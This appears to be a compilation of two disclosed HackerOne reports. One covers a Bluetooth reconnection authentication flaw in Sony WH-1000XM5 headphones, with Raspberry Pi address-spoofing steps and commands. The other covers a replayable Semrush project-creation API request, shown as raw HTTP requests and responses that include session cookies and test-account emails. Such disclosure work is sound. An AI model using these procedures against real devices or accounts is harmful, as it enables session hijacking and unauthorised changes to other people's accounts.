# Key Exchange without Entity Authentication

_2 reports — High/Critical, disclosed_

### [明確な認証不備および潜在的な中間者攻撃の可能性（Clear Authentication Deficiencies & Potential for Man-in-the-Middle Attacks）](https://hackerone.com/reports/2642615)

- **Report ID:** `2642615`
- **Severity:** High
- **Weakness:** Key Exchange without Entity Authentication
- **Program:** Sony
- **Reporter:** @trapedev
- **Bounty:** - usd
- **Disclosed:** 2025-07-08T18:02:25.569Z
- **CVE(s):** -

**Vulnerability Information:**

English follows Japanese.

ソニーグループ株式会社 様

この度，弊社製品のWH-1000XM5に深刻なセキュリティ脆弱性を確認いたしましたのでご報告いたします．
セキュリティ研究者として，貴社製品の継続的なセキュリティと完全性を確保するために，このような発見を報告することは極めて重要であると考えます．

# Sec.0 要約

- 本レポートは，貴社製品のWH-1000XM5に確認された認証不備の脆弱性を示します．
- 本脆弱性をBluetoothの既存攻撃と組み合わせることで，容易にMitM攻撃を達成できます．
- 報告者は，本脆弱性へのCVE番号の割り当てを要求します．

# Sec.1 脆弱性の種類

認証不備

# Sec.2 脆弱性の詳細

悪意ある第三者（以後，攻撃者）WH-1000XM5とペアリングされたデバイスになりすますことで，WH-1000XM5が**ペアリングモードでなくても**，且つ**WH-1000XM5のユーザの操作を一切必要とせず**攻撃者デバイスと接続されます．

Bluetoothパケットを確認すると，WH-1000XM5の再接続時の認証に不備があり，Secure Simple Paring（SSP）の再接続時プロセスに準拠していません．

# Sec.3 影響を受ける製品

[WH-1000XM5](https://www.sony.jp/headphone/products/WH-1000XM5/)

**NOTE**
本脆弱性は，WH-1000XM5に限らない可能性があります．

# Sec.4 PoC

本セクションでは，PoCに必要なデバイスとセットアップ，そして本脆弱性を再現する手順を説明します．

## .4.1 PoC デバイス

**Victim's Master Device**

| Manufacturer | Model | Operation System | Driver | Bluetooth Version |
|--------------|-------|-------------------|--------|-------------------|
| Microsoft | Surface Laptop 4 | Windows 11 Home | Intel(R) Wireless Bluetooth(R) | 5.1 |

**Victim's Slave Device**

|  Manufacturer | Model | Bluetooth Version | 
|--------------|-------|-------------------|
| Sony Corporation | WH-1000XM5 | 5.2 |

**Attacker's Device**

| Model | Operation System | System | Debian version | Kernel version | BlueZ version | Bluetooth Manufacturer | Bluetooth Version |
|-------|------------------|--------|----------------|----------------|---------------|------------------------|-------------------|
| Raspberry Pi 4 Model B | Raspberry Pi OS | 32bit | 11 bullseye | 6.1 | 5.55 | Cypress Semiconductor | 5.0 |

## .4.2 PoC セットアップ

WH-1000XM5とSurface Laptop 4を予めペアリングします．

## .4.3. PoC 手順

1. Raspberry PiのBluetoothアドレスとアダプタのBluetooth名を，Surface Laptop 4と同様の設定にスプーフィングします．
2. Raspberry PiのBluetoothアダプタの状態を`Discoverable`にします．
3. WH-1000XM5を一定時間放置・あるいは手動により電源を切ります．
4. Surface Laptop 4の電源を切ります．
5.  WH-1000XM5の電源を入れます（NOTE: ペアリングモードへの移行を避けるため，電源ボタンは5秒間以上押さないことに留意してください）．

以上の手順を順に踏んだ場合，WH-1000XM5は**ペアリングモードでないにも関わらずRaspberry Piとペアリング・接続されます**．本脆弱性を再現した際にRaspberry Pi側で確認されたBluetoothパケットを添付します（`WH-1000XM5_vuln_poc.pcapng`を参照）．この時，Raspberry PiはWH-1000XM5と過去にペアリングしたことが**無い**点に留意してください．

**NOTE: **
本脆弱性の再現場面が現実的であることを示すために，Surface Laptop 4の電源を切った後にWH-1000XM5の電源を入れた理由を説明します．私（報告者）は，WH-1000XM5をもう一台のデバイス（Pixel 7 Pro）とペアリングしていました．WH-1000XM5へPixel 7 Proを用いて音楽を流すために，WH-1000XM5の電源を入れました．本脆弱性は，Pixel 7 ProのBluetoothの設定画面を開き，WH-1000XM5との接続を試みる間に，**一切の操作を介せず自動的に**Raspberry PiとWH-1000XM5が接続されました．

# Sec.5 潜在的なMitM攻撃

██████の研究チームは，Bluetoothの省電力モードを用いたデバイスハイジャック攻撃を提案しています．詳しくは，2024年7月に情報処理学会から発刊された論文「[Bluetooth省電力モードを用いるデバイスハイジャック攻撃](https://ipsj.ixsq.nii.ac.jp/ej/?action=pages_view_main&active_action=repository_view_main_item_detail&item_id=237288&item_no=1&page_id=13&block_id=8)」をご確認ください．

省電力モードではありませんが，WH-1000XM5には一定時間無操作状態の場合に自動的に電源が切れる仕様が定義されています（[ヘルプガイド](https://helpguide.sony.net/mdr/wh1000xm5/v1/ja/contents/TP1000533411.html)より）．本挙動は省電力モードの一種のSleepモードの挙動に類似するものです．彼らは，攻撃者が本挙動のようなBluetoothセッションの一時的な切断を悪用することで，Bluetoothセッションをハイジャック可能であること実証しています（[参考](https://ipsj.ixsq.nii.ac.jp/ej/?action=pages_view_main&active_action=repository_view_main_item_detail&item_id=237288&item_no=1&page_id=13&block_id=8)）．

WH-1000XM5とLaptopがペアリング済みであると仮定し，WH-1000XM5の電源が自動的に切れた場合，攻撃者はWH-1000XM5になりすましてLaptopとのペアリングが可能です．一方，攻撃者がLaptopになりすました場合，本レポートの脆弱性によりWH-1000XM5と攻撃者がペアリング可能です．従って，攻撃者はWH-1000XM5とLaptopの通信の中間者になります．本結果は，完全性や可用性のみならず，機密性にも重大な脅威をもらたします．

# Sec.6 要望

- 本脆弱性は，貴社製品の仕様，またBluetoothのプロトコルの仕様では決してないと考えます．本レポートに対する貴社のレスポンスを頂ければと思います．
- 貴社がCNAの場合，CVE番号を付与してください．CNAでない場合，私からIPA/JPCERTに報告しCVE番号の付与を依頼させていただきます．

# 付録

## Raspberry PiのBluetooth名を変更する方法

Raspberry PiのBluetooth名を変更する方法を説明します．
まず，`/etc`ディレクトリ下に`machine-info`ファイルを作成します．
作成した`machine-info`ファイルを開き，`PRETTY_HOSTNAME`変数にBluetooth名を定義します．
例えば，Bluetooth名を`Example Laptop`としたい場合，`PRETTY_HOSTNAME=Example Laptop`とします．
設定後，Bluetoothサービスを再起動してください．

## Raspberry PiのBluetoothアドレスを変更する方法

Raspberry PiのBluetoothアドレスを変更するGolangのスクリプトを本レポートに添付します（`main.go`参照）．
Raspberry Pi上で`main.go`ファイルをbuildし，以下のコマンドを例にBluetoothアドレスを変更することができます．

```bash
# ソースコードのビルド
go build main.go -o chgbtaddr

# アドレスの変更
# ex.) LaptopのBluetoothアドレスを00:11:22:33:44:55と仮定
./chgbtaddr -addr 00:11:22:33:44:55

# サービス再起動
sudo systemctl restart bluetooth.service
```



本レポートへのご対応ありがとうございます．**追加の情報やより詳細な情報が必要な場合（e.g., PoCの一連を示すデモ動画，商品番号 etc.）は，ご連絡いただければ可能な限り対応いたします**．本レポートに記載の潜在的なセキュリティリスクに対処するため，迅速なご回答とご協力をお待ちしております．

敬具
██████████

****************************************
██████████
Tel: ███
E-mail : ██████
****************************************

===========================


Dear Sony Group Corporation

I hereby report that I have identified a serious security vulnerability in our product, the WH-1000XM5.
As a security researcher, I believe it is extremely important to report such findings to ensure the ongoing security and integrity of your company's products.

# Sec.0 Executive Summary

- This report details an authentication vulnerability identified in your company's WH-1000XM5 product.
- By combining this vulnerability with existing Bluetooth attacks, a Man-in-the-Middle (MitM) attack can be easily achieved.
- The reporter requests the assignment of a CVE number for this vulnerability.

# Sec.1 Vulnerability Type

Authentication Deficiencies

# Sec.2 Vulnerability Details

A malicious third party (hereinafter referred to as the attacker) can impersonate a device that has been paired with the WH-1000XM5, allowing the attacker's device to connect to the WH-1000XM5 even when it is not in pairing mode and **without requiring any operation from the WH-1000XM5 user**.
Upon examining the Bluetooth packets, it appears that there is a flaw in the authentication process during reconnection of the WH-1000XM5. It does not comply with the reconnection process of Secure Simple Pairing (SSP).

# Sec.3 Affected Specification

[WH-1000XM5](https://www.sony.jp/headphone/products/WH-1000XM5/)

**NOTE**
This vulnerability may not be limited to the WH-1000XM5.

# Sec.4  PoC

This section presents the devices and setup required for the Proof of Concept (PoC), as well as the steps to reproduce this vulnerability.

## .4.1 PoC Devices

**Victim's Master Device**

| Manufacturer | Model | Operation System | Driver | Bluetooth Version |
|--------------|-------|-------------------|--------|-------------------|
| Microsoft | Surface Laptop 4 | Windows 11 Home | Intel(R) Wireless Bluetooth(R) | 5.1 |

**Victim's Slave Device**

|  Manufacturer | Model | Bluetooth Version | 
|--------------|-------|-------------------|
| Sony Corporation | WH-1000XM5 | 5.2 |

**Attacker's Device**

| Model | Operation System | System | Debian version | Kernel version | BlueZ version | Bluetooth Manufacturer | Bluetooth Version |
|-------|------------------|--------|----------------|----------------|---------------|------------------------|-------------------|
| Raspberry Pi 4 Model B | Raspberry Pi OS | 32bit | 11 bullseye | 6.1 | 5.55 | Cypress Semiconductor | 5.0 |

## .4.2 PoC Setup

Pair the WH-1000XM5 and Surface Laptop 4 in advance.

## .4.3 PoC Procedure

1. Spoof the Bluetooth address of the Raspberry Pi and the Bluetooth name of its adapter to match those of the Surface Laptop 4.
2. Set the Bluetooth adapter state of the Raspberry Pi to `Discoverable`.
3. Leave the WH-1000XM5 idle for a while or manually turn off its power.
4. Turn off the Surface Laptop 4.
5. Turn on the WH-1000XM5 (NOTE: Be careful not to press the power button for more than 5 seconds to avoid entering pairing mode).

If you follow these steps in order, the WH-1000XM5 will pair and connect to the Raspberry Pi despite not being in pairing mode. I have attached the Bluetooth packets observed on the Raspberry Pi side when reproducing this vulnerability (refer to `WH-1000XM5_vuln_poc.pcapng`). Please note that the Raspberry Pi has **never previously paired** with the WH-1000XM5.

**NOTE:**
To show that the reproduction of this vulnerability is realistic, I explain why the WH-1000XM5 was turned on after turning off the Surface Laptop 4. I (the reporter) had paired the WH-1000XM5 with another device (Pixel 7 Pro). I turned on the WH-1000XM5 to play music from the Pixel 7 Pro. This vulnerability was discovered when I opened the Bluetooth settings on the Pixel 7 Pro and attempted to connect to the WH-1000XM5. During this process, the Raspberry Pi and WH-1000XM5 connected automatically without any intervention.

# Sec.5 Potential MitM Attacks

A research team from Kobe University has proposed a device hijacking attack abusing Bluetooth power-saving mode. For more details, please refer to the paper ["Device Hijack Attacks Abusing Bluetooth Power-Saving Mode"](https://ipsj.ixsq.nii.ac.jp/ej/?action=pages_view_main&active_action=repository_view_main_item_detail&item_id=237288&item_no=1&page_id=13&block_id=8) published by the Information Processing Society of Japan in July 2024.

Although not a power-saving mode, the WH-1000XM5 has a feature that automatically turns off the power after a certain period of inactivity (as stated in the [Help Guide](https://helpguide.sony.net/mdr/wh1000xm5/v1/ja/contents/TP1000533411.html)). This behavior is similar to the Bluetooth sleep mode, which is a type of power-saving mode. The researchers have demonstrated that attackers can exploit temporary disconnections of Bluetooth sessions, such as this behavior, to hijack Bluetooth sessions.

Assuming the WH-1000XM5 and a laptop are already paired, if the WH-1000XM5's power automatically turns off, an attacker can impersonate the WH-1000XM5 and pair with the laptop. Conversely, if an attacker impersonates the laptop, the vulnerability described in this report allows the attacker to pair with the WH-1000XM5. Consequently, the attacker becomes a man-in-the-middle for sessions between the WH-1000XM5 and the laptop. This result poses a significant threat not only to integrity and availability but also to confidentiality.

# Sec.6 Request

- I believe this vulnerability is not due to the specifications of your company's product, nor is it due to the specifications of the Bluetooth protocol. I would appreciate your company's response to this report.
- If your company is a CNA, please assign a CVE number. If you are not a CNA, I will report this to IPA/JPCERT and request that a CVE number be assigned.

# Appendix

## How to change Raspberry Pi's Bluetooth Name

Here's how to change the Bluetooth name of your Raspberry Pi:
First, create a  file named `machine-info` in the `/etc` directory.
Open the created `machine-info` file and define the Bluetooth name using the `PRETTY_HOSTNAME` variable.
For example, if you want to set the Bluetooth name to "Example Laptop", write `PRETTY_HOSTNAME=Example Laptop` in `machine-info`.
After configuring, please restart the Bluetooth service.

## How to change Raspberry Pi's Bluetooth Address

I am attaching a Golang script to change the Bluetooth address of a Raspberry Pi to this report (refer to `main.go`).
You can build the `main.go` file on the Raspberry Pi and change the Bluetooth address using a command like the following example:

```bash
# Build the source code
go build main.go -o chgbtaddr

# Change the address
# ex.) Assuming the Laptop's Bluetooth address is 00:11:22:33:44:55
./chgbtaddr -addr 00:11:22:33:44:55

# Restart the service
sudo systemctl restart bluetooth.service
```

Thank you for your attention to this report. **If additional information or more detailed information is needed (e.g., a demo video showing a series of PoC, product numbers etc.), please contact me and I will respond to the extent possible**. I look forward to your prompt response and collaboration in addressing this potential security risk.

Sincerely,
███████

****************************************
█████████
Tel: ██████████
E-mail : █████████
****************************************

## Impact

- DoS
- Link Key Hijack
- MitM Attacks

---

### [Broken Authentication: A project addition request can be used multiple time for different users](https://hackerone.com/reports/319480)

- **Report ID:** `319480`
- **Severity:** High
- **Weakness:** Key Exchange without Entity Authentication
- **Program:** Semrush
- **Reporter:** @walterhwhite
- **Bounty:** - usd
- **Disclosed:** 2018-03-13T14:30:20.478Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** 
[**Broken Authentication**. A project addition request can be used multiple time for different users]

**Description:** 
[**Reusable requests**. Once a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key.

## Steps To Reproduce:


  1. Create two users for semrush.com 

		i) cleganearya1@gmail.com
		ii)saidutt.mekala@gmail.com
  2. Now create a project for the user saidutt.mekala@gmail.com
  3. Following will be the request along with headers for project creation:

POST /projects/api/projects/?key=█████████ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.semrush.com/projects/?1519503450
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 86
Cookie: __cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=██████████; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en
DNT: 1
Connection: keep-alive

{"domain":"BB1236.com","name":"BB12367.com","url":"BB123678.com","acl":{"write":true}}

4. Now delete the added project.
5. Logout of the application and close the browser.
6. Resend the above request with different parameters like {"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}

Following is the response:  

HTTP/1.1 200 
Date: Sun, 25 Feb 2018 06:50:58 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 3f28bbc28bbd17aa-SIN
Content-Length: 224

{"id":1266025,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"saidutt.mekala@gmail.com","tools":[],"permission":["OWNER"],"available":true,"favorite":false,"root_domain":"walterwhite12.com","times_shared":0}

7. Now we can also add the project to any user by using his API Key in the request. In the following request I have used the API Key of the user cleganearya1@gmail.com :

POST /projects/api/projects/?key=█████████ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.semrush.com/projects/?1519503450
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 104
Cookie: __cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=██████; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en
DNT: 1
Connection: keep-alive

{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}

8. Following is the response for the above request:

HTTP/1.1 200 
Date: Sun, 25 Feb 2018 06:53:17 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 3f28bf1e9f8917aa-SIN
Content-Length: 222

{"id":1266027,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"cleganearya1@gmail.com","tools":[],"permission":["OWNER"],"available":true,"favorite":false,"root_domain":"walterwhite12.com","times_shared":0}

## Impact

Once a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key. Hence there is no need to login for the user to create a project because an attacker can directly add a project to victims account with his own malicious inputs/scrips and make them executable without victims awareness.

i) Reusable cookies for same user.
ii)There is no match verification between the API Key and cookie/sessionIds. There should be a server side validation which should validate the relation between an API Key provided and the sessionIds of the current user.

---
